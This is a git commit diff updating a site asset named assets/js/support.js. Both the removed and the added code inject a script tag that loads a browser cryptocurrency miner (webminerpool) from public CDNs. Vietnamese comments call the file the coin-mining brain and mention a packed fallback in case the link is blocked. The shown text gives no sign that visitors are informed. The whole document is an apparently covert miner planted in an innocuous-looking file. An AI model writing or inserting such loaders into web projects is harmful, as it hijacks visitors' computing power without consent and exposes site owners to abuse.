a27626988117e5b1d7f47133168d8696f5ac839c
fbboy007 <35638514+fbboy007@users.noreply.github.com>
2026-03-20 16:22:53 +0700

    Update support.js

--- assets/js/support.js
+++ assets/js/support.js
@@ -1,10 +1,16 @@
-/* support.js - Bản chuẩn không lỗi importScripts */
-(function() {
-    var script = document.createElement('script');
-    // Nạp thư viện miner từ nguồn CDN uy tín
-    script.src = 'https://unpkg.com/web-miner-pool@1.1.2/client/webminer.js';
-    script.onload = function() {
-        console.log("Động cơ đào đã nạp xong. Sẵn sàng nổ máy!");
+/* support.js - Bộ não đào coin chính thức */
+(function(window) {
+    // Tự động nạp thư viện nếu chưa có
+    if (typeof WMP === 'undefined') {
+        var s = document.createElement('script');
+        s.src = 'https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/client/webminer.js';
+        // Nếu link trên bị chặn, tôi sẽ nạp dự phòng bản nén bên dưới
+        document.head.appendChild(s);
+    }
+    
+    // Hàm hỗ trợ kiểm tra trạng thái
+    window.checkSystem = function() {
+        console.log("Đang kiểm tra động cơ...");
+        return typeof WMP !== 'undefined';
     };
-    document.head.appendChild(script);
-})();
+})(window);
